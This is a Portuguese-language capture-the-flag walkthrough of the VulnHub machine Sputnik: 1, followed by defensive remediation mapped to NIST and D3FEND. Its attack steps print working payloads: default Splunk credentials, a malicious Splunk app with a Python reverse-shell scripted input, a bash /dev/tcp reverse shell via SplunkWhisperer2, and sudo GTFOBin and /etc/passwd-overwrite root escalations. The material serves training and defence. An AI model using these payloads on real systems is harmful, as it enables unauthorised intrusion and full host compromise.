# Sputnik: 1 — Houston, Temos um Splunk

Que máquina incrível!! Sputnik: 1 tem tema da corrida espacial soviética e entrega uma corrente de ataque genuinamente criativa. Uma instância Splunk Free rodando em porta não padrão, acessível com credenciais padrão (ou sem autenticação em algumas versões), e aberta para instalação de aplicações personalizadas. Carregue um app Splunk malicioso com um scripted input, aguarde o intervalo disparar, e seu reverse shell chega. O escalonamento de privilégios completa a experiência com um GTFOBin limpo ou abuso de sudo. Esta box ensina algo diretamente aplicável em ambientes SOC reais onde o Splunk é implantado com configurações padrão. Sensacional demais, véi!

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Sputnik: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sputnik-1,341/ |
| **Técnicas** | Descoberta de host, enumeração de serviços nmap, credenciais padrão Splunk, instalação de app personalizado Splunk, reverse shell via scripted input, shell Python no app Splunk, estabilização de shell, enumeração sudo, escalonamento de privilégios GTFOBins |
| **CVEs** | CWE-798 (Uso de Credenciais Hardcoded: credenciais padrão admin Splunk), CWE-284 (Controle de Acesso Impróprio: API Splunk exposta sem restrição de rede), CWE-269 (Gestão Inadequada de Privilégios: configuração incorreta de sudo) |
| **Grupos APT** | APT10 (Stone Panda): aproveitou interfaces de gerenciamento Splunk expostas em ambientes empresariais para executar comandos arbitrários; APT41: explora plataformas de monitoramento e gerenciamento de logs expostas com credenciais padrão como vetores de acesso inicial |

---

## Resumo do Ataque

```
netdiscover / nmap
  → porta 22 (SSH), porta 80 (HTTP), porta 8089 (API Splunk HTTPS)
  → http://alvo:8089/ → Splunk Free ou padrão admin:changeme
  → criar app Splunk malicioso com scripted input (Python reverse shell)
  → enviar app via REST API ou interface web
  → nc -lvnp 4444 → scripted input dispara → shell como splunk/www-data
  → python3 pty estabilizar
  → sudo -l → sudo mal configurado ou binário SUID
  → GTFOBin ou exploit sudo → uid=0(root)
  → cat /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas
2. Enumeração de serviços web em HTTP e porta de gerenciamento Splunk
3. Detecção de versão Splunk e teste de credenciais
4. Criação de app Splunk malicioso com scripted input Python de reverse shell
5. Upload e instalação do app via API REST ou interface web Splunk
6. Captura e estabilização do reverse shell
7. Enumeração pós-exploração: direitos sudo, binários SUID, cron jobs
8. Escalonamento de privilégios via abuso de sudo ou GTFOBin
9. Captura da flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

Identifique o alvo na rede local:

```bash
netdiscover
# ou: sudo netdiscover -r 192.168.1.0/24
export TARGET=192.168.1.x

nmap -sV -sC -p- $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd 2.4.x
8089/tcp open  ssl/http Splunk httpd
```

O achado crítico é a porta 8089: API de gerenciamento Splunk via HTTPS. Esta é a superfície de ataque principal. A porta 80 pode conter dicas adicionais.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1595.001 — Varredura Ativa: Varredura de Blocos IP

---

## Passo 2 — Enumeração Web e Descoberta Splunk

**Porta 80 (HTTP):**

```bash
curl -s http://$TARGET/
curl -s http://$TARGET/robots.txt
gobuster dir \
  -u http://$TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 30
```

A página web principal pode conter dicas sobre a instância Splunk ou credenciais.

**Porta 8089 (API de Gerenciamento Splunk):**

Navegue para `https://$TARGET:8089/` no navegador (aceite o certificado autoassinado). Esta é a API REST de gerenciamento Splunk Free ou Universal Forwarder.

Teste credenciais padrão:

```bash
curl -k -u admin:changeme https://$TARGET:8089/services
curl -k -u admin:admin https://$TARGET:8089/services
curl -k -u admin:password https://$TARGET:8089/services
```

No Splunk Free (pré-6.3), a API de gerenciamento pode não exigir nenhuma autenticação:

```bash
curl -k https://$TARGET:8089/services
```

Se uma resposta com informações do serviço Splunk for retornada, a API está acessível.

**Nota real:** O Splunk é implantado em ambientes empresariais como SIEM e agregador de logs, frequentemente com acesso privilegiado a dados de log de milhares de hosts. A API de gerenciamento na porta 8089 é frequentemente deixada acessível na rede sem restrição. O APT10 e o APT41 têm como alvo específico instâncias Splunk expostas durante intrusões empresariais, usando a API de gerenciamento para instalar apps maliciosos que executam comandos do sistema sob a conta de serviço Splunk.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1592 — Coletar Informações do Host da Vítima

---

## Passo 3 — Criação de Aplicação Splunk Maliciosa

Apps Splunk podem incluir "scripted inputs": scripts que o Splunk executa em um cronograma para coletar dados. Este é o mecanismo de exploração.

Crie a estrutura de diretórios do app:

```bash
mkdir -p /tmp/splunk_rce/sputnik/bin
mkdir -p /tmp/splunk_rce/sputnik/default

# Configurar o scripted input
cat > /tmp/splunk_rce/sputnik/default/inputs.conf << 'EOF'
[script://./bin/rev.py]
disabled = false
interval = 10
sourcetype = rce
EOF
```

Crie o payload Python de reverse shell:

```bash
export LHOST=192.168.1.x  # IP do atacante
export LPORT=4444

cat > /tmp/splunk_rce/sputnik/bin/rev.py << PYEOF
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$LHOST", $LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
PYEOF

chmod +x /tmp/splunk_rce/sputnik/bin/rev.py
```

Empacote a aplicação:

```bash
cd /tmp/splunk_rce
tar czf /tmp/sputnik_rce.tar.gz sputnik/
```

**MITRE ATT&CK:** T1059.006 — Interpretador de Comandos: Python

---

## Passo 4 — Entrega do Reverse Shell via Upload do App Splunk

Inicie o listener:

```bash
nc -lvnp $LPORT
```

Carregue o app malicioso via API REST do Splunk:

```bash
# Com credenciais padrão
curl -k -u admin:changeme \
  https://$TARGET:8089/services/apps/local \
  -F "name=sputnik" \
  --upload-file /tmp/sputnik_rce.tar.gz

# Alternativa: usando interface web Splunk
# Navegue para: https://ALVO:8089/en-US/manager/launcher/apps/local
# Clique "Install app from file" → faça upload do sputnik_rce.tar.gz
```

Aguarde até 10 segundos (o `interval = 10` no inputs.conf). O scripted input dispara e o reverse shell se conecta.

**Alternativa usando SplunkWhisperer2:**

```bash
git clone https://github.com/DaniloCaruso/SplunkWhisperer2.git
cd SplunkWhisperer2/PySplunkWhisperer2/
python3 PySplunkWhisperer2_remote.py \
  --host $TARGET \
  --port 8089 \
  --username admin \
  --password changeme \
  --payload "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" \
  --lhost $LHOST \
  --lport 8090
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação Pública; T1059.004 — Unix Shell

---

## Passo 5 — Estabilização do Shell

O shell chega como o usuário do serviço Splunk (geralmente `splunk`, `root` ou `www-data`). Estabilize imediatamente:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ou: python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Pressione Ctrl+Z para colocar em segundo plano
stty raw -echo; fg
# Pressione Enter duas vezes
```

Verifique o contexto:

```bash
whoami && id
uname -a
hostname
```

Se já estiver rodando como root (Splunk rodando como root é uma configuração crítica incorreta mas comum), pule direto para a captura da flag.

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell

---

## Passo 6 — Enumeração Pós-Exploração

Enumere todos os vetores de escalonamento de privilégios:

```bash
# Direitos sudo
sudo -l

# Binários SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null

# Arquivos graváveis por todos
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run

# Arquivos interessantes
find /home -name "*.txt" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null

# Serviços em execução
ps aux
ss -tlnp
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1057 — Descoberta de Processos; T1053.003 — Tarefa Agendada: Cron

---

## Passo 7 — Escalonamento de Privilégios para Root

Aplique o vetor de escalonamento identificado:

**Via sudo (comum no Sputnik: 1):**

```bash
sudo -l
# Exemplo de saída: (root) NOPASSWD: /usr/bin/nmap
# ou: (root) NOPASSWD: /usr/bin/python3
# ou: (root) NOPASSWD: /bin/cp
```

Exploração GTFOBins:

```bash
# nmap (versão antiga com --interactive):
sudo nmap --interactive
# então: !sh

# python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

# find:
sudo find / -name flag -exec /bin/sh \; -quit

# cp (sobrescrever /etc/passwd):
openssl passwd -1 novasenha
echo 'hacker:$1$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
cat /etc/passwd > /tmp/passwd_new
echo 'hacker:$1$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
sudo cp /tmp/passwd_new /etc/passwd
su hacker  # senha: novasenha
```

**Via binário SUID:**

```bash
find / -perm -4000 -type f 2>/dev/null
# Identificar binário SUID não padrão
strings /caminho/para/binario-suid
# Se chamadas de comandos relativas: PATH hijacking
# Se GTFOBin: aplicar técnica
```

Shell root obtido.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ᴥ❍ʋ) Root. Missão Sputnik concluída. Caramba, que box incrível!

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo; T1068 — Exploração para Escalonamento de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial Splunk | `admin:changeme` | Instalação padrão Splunk | Upload de app via API Splunk |
| Shell inicial | splunk/www-data/root | Scripted input Splunk | Acesso ao sistema |
| Flag root | (varia) | /root/flag.txt | Prova de comprometimento |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | API Splunk exposta com credenciais padrão | Implantações empresariais Splunk frequentemente deixam a porta 8089 acessível com credenciais admin:changeme inalteradas | Vincule API Splunk ao localhost; use certificados TLS de cliente; mude a senha padrão imediatamente após instalação |
| 2 | Splunk rodando como root | Uma porcentagem significativa de instalações Splunk roda como root por simplicidade | Execute Splunk como conta de serviço dedicada de baixo privilégio |
| 3 | Scripted inputs Splunk permitem execução arbitrária de comandos | Esta é uma funcionalidade, não um bug, mas em instância Splunk comprometida fornece RCE em nível de SO | Restrinja instalação de apps a usuários autorizados; audite apps instalados regularmente |
| 4 | Configuração incorreta sudo concede acesso root irrestrito | Sudo mal configurado é consistentemente o achado #1 em pentests Linux | Audite sudoers regularmente; aplique menor privilégio; exija senhas para operações sudo sensíveis |
| 5 | Dados Splunk contêm informações sensíveis de log | Instâncias Splunk reais contêm logs de credenciais, eventos de segurança e dados operacionais de milhares de hosts | Implemente controles de acesso adequados nos dashboards Splunk |

---

## MITRE ATT&CK Mapeamento

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Varredura Ativa | Varredura de Blocos IP | T1595.001 |
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso Inicial | Contas Válidas | Contas Padrão | T1078.001 |
| Execução | Execução | Python Scripted Input | T1059.006 |
| Execução | Execução | Unix Shell | T1059.004 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Descoberta | Descoberta | Descoberta de Processos | T1057 |
| Descoberta | Descoberta | Descoberta de Tarefa Agendada | T1053.003 |
| Escalonamento | Escalonamento | Abuso de Controle: Sudo | T1548.003 |
| Escalonamento | Escalonamento | Exploração para Escalonamento | T1068 |
| Coleta | Coleta | Dados do Sistema Local | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Vincular API Splunk ao localhost**: em `$SPLUNK_HOME/etc/system/local/server.conf`, definir `mgmtHostPort = 127.0.0.1:8089`
2. **Mudar senha padrão admin Splunk** imediatamente após instalação; usar senha aleatória de 16+ caracteres
3. **Executar Splunk como conta de serviço de baixo privilégio**: nunca rodar Splunk como root; criar usuário OS `splunk` com permissões mínimas
4. **Restringir instalação de apps**: configurar instalações Splunk para exigir aprovação de admin; auditar todos os apps instalados regularmente
5. **Implantar regras de firewall**: bloquear acesso externo à porta 8089; restringir acesso interno a hosts de gerenciamento autorizados
6. **Corrigir configuração incorreta sudo**: remover concessões sudo desnecessárias; aplicar menor privilégio

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as instâncias Splunk; documentar contas de serviço |
| Proteger | Controle de Acesso | Vincular API ao localhost; impor autenticação |
| Proteger | Gestão de Identidade | Mudar credenciais padrão; executar como conta não root |
| Detectar | Anomalias e Eventos | Monitorar eventos de instalação de app Splunk |
| Responder | Planejamento de Resposta | Remover apps maliciosos; rotacionar credenciais Splunk |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; restaurar Splunk de configuração limpa |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Controle de Acesso | Restringir acesso à API Splunk |
| AC-6 | Menor Privilégio | Executar Splunk como não root; restringir sudo |
| IA-5(1) | Gestão de Autenticadores | Mudar credenciais padrão; impor política de senha forte |
| CM-7 | Menor Funcionalidade | Vincular serviços ao localhost; desabilitar recursos desnecessários |
| SC-7 | Proteção de Fronteira | Regras de firewall bloqueando acesso externo à porta 8089 |
| AU-12 | Geração de Registros de Auditoria | Registrar todos os eventos de instalação de app e scripted input Splunk |

### CISA KEV

Plataformas de monitoramento expostas com credenciais padrão se alinham com o Alerta CISA AA22-265A descrevendo atores de ameaça explorando ferramentas de monitoramento de rede (incluindo plataformas SIEM) com credenciais padrão para acesso inicial.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gestão de Ativos (ASSET) | Gerenciar Inventário de Ativos TI | MIL2 |
| Consciência Situacional (SITUATION) | Realizar Detecção de Eventos e Incidentes | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (vincular Splunk ao localhost; desabilitar instalação de apps por padrão)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (executar Splunk como não root; auditar sudo)
- **D3-NTF** — Filtragem de Tráfego de Rede (regras de firewall bloqueando acesso externo ao gerenciamento Splunk)
- **D3-UA** — Gestão de Contas de Usuário (mudar credenciais padrão; impor senhas fortes)

---

## Pensamentos Finais

Sputnik: 1 é uma joia esquecida que ensina um vetor de ataque do mundo real: plataformas SIEM e de gerenciamento de logs como superfícies de ataque, mano. Em ambientes de produção, o Splunk é frequentemente o serviço de maior privilégio na rede, com acesso a logs de todos os sistemas, rodando como root e acessível com credenciais padrão. Esta box ensina a pensar sobre a infraestrutura de monitoramento não como ferramenta de defensor, mas como potencial ponto de apoio do atacante.

O tema é inteligente, a exploração é limpa e a lição do mundo real é imediatamente aplicável. Design sensacional demais, véi!

Thanks guys!! (❍ᴥ❍ʋ)
